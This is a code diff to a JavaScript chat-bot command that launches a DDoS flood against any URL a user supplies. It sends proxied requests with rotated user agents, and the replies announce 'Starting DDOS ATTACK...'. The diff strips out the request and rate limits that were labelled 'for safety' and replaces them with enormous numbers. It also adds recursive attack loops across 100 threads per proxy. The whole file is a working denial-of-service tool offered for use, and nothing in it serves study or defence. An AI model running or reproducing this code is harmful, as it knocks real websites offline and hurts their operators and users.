@@ -16,9 +16,7 @@ module.exports["config"] = {
     usage: "[url]",
 };
 
-const {
-    generateUserAgent
-} = require('../system/useragent.js');
+const { generateUserAgent } = require('../system/useragent.js');
 
 const langHeader = [
     "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
@@ -66,17 +64,15 @@ const acceptHeader = [
     "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
 ];
 
-const numThreads = 100;
-const maxRequests = 1000000; // Adjust the limit to a more reasonable number for safety
-const requestsPerSecond = 1000000; // Adjust the request rate to a manageable level
+const maxRequests = 10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000; // Set the max number of requests
+const requestsPerSecond = 1000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000; // Requests per second
+const numThreads = 100; // Number of threads
 
 function randElement(arr) {
     return arr[Math.floor(Math.random() * arr.length)];
 }
 
-module.exports["run"] = async ({
-    args, chat, font
-}) => {
+module.exports["run"] = async ({ args, chat, font }) => {
     const targetUrl = args[0];
     if (!targetUrl || (!targetUrl.startsWith("http://") && !targetUrl.startsWith("https://"))) {
         return chat.reply(font.thin("Invalid URL. Please enter a valid URL starting with http:// or https://"));
@@ -103,48 +99,52 @@ module.exports["run"] = async ({
         }
     })();
 
+    let continueAttack = true;
     const start = await chat.reply(font.thin("Starting DDOS ATTACK..."));
 
-    const sendRequest = (url, agent) => {
-        headers["User-Agent"] = generateUserAgent();
+    const attack = (url, agent) => {
+        try {
+            if (!continueAttack) return;
 
-        axios
-        .get(url, {
-            httpAgent: agent || null, headers
-        })
-        .then(() => console.log(`Request to ${url} succeeded.`))
-        .catch((error) => {
-            if (error.response && error.response.status === 503) {
-                chat.log("BOOM BAGSAK ANG GAGO HAHAHA 🤣🤣");
-            } else if (error.response && error.response.status === 502) {
-                chat.log("Error: Request failed with status code 502");
-            } else {
-                chat.log("Error: " + error.message);
-            }
-        });
+            headers["User-Agent"] = generateUserAgent();
+
+            axios
+                .get(url, { httpAgent: agent || null, headers })
+                .then((response) => {
+                    if (response.status === 503) {
+                        // Optional: Log or handle 503 status
+                    }
+                })
+                .catch((error) => {
+                    if (error.response && error.response.status === 502) {
+                        // Optional: Log or handle 502 status
+                    }
+                });
+
+            setTimeout(() => attack(url, agent), 1000 / requestsPerSecond);
+        } catch (error) {
+            console.log("Error: " + error.message);
+            setTimeout(() => attack(url, agent), 1000 / requestsPerSecond);
+        }
     };
 
-    try {
-        let requests = 0;
+    let requests = 0;
+    for (let i = 0; i < numThreads; i++) {
         for (let proxy of proxies) {
             const proxyParts = proxy.split(":");
             const agent =
-            proxyParts[0].startsWith("socks")
-            ? new SocksProxyAgent(`socks5://${proxyParts[0]}:${proxyParts[1]}`): new HttpsProxyAgent(`http://${proxyParts[0]}:${proxyParts[1]}`);
+                proxyParts[0].startsWith("socks")
+                    ? new SocksProxyAgent(`socks5://${proxyParts[0]}:${proxyParts[1]}`)
+                    : new HttpsProxyAgent(`http://${proxyParts[0]}:${proxyParts[1]}`);
 
-            setInterval(() => {
-                if (requests >= maxRequests) return; // Limit the number of requests for safety
-                sendRequest(targetUrl, agent);
-                requests++;
-            },
-                1000 / requestsPerSecond); // Request rate
-
-            if (requests >= numThreads) break; // Stop after a specified number of threads
+            attack(targetUrl, agent);
         }
-
-        chat.reply(font.thin("DDOS Attack initiated."));
-    } catch (error) {
-        chat.reply(font.thin(`Error: ${error.message || "An error occurred."}`));
-        start.unsend();
     }
+
+    setTimeout(() => {
+        continueAttack = false;
+        chat.log('Max Flood requests reached.');
+        chat.reply(font.thin("Max Flood requests reached, attack stopped."));
+    }, (maxRequests / requestsPerSecond) * 1000);
+
 };
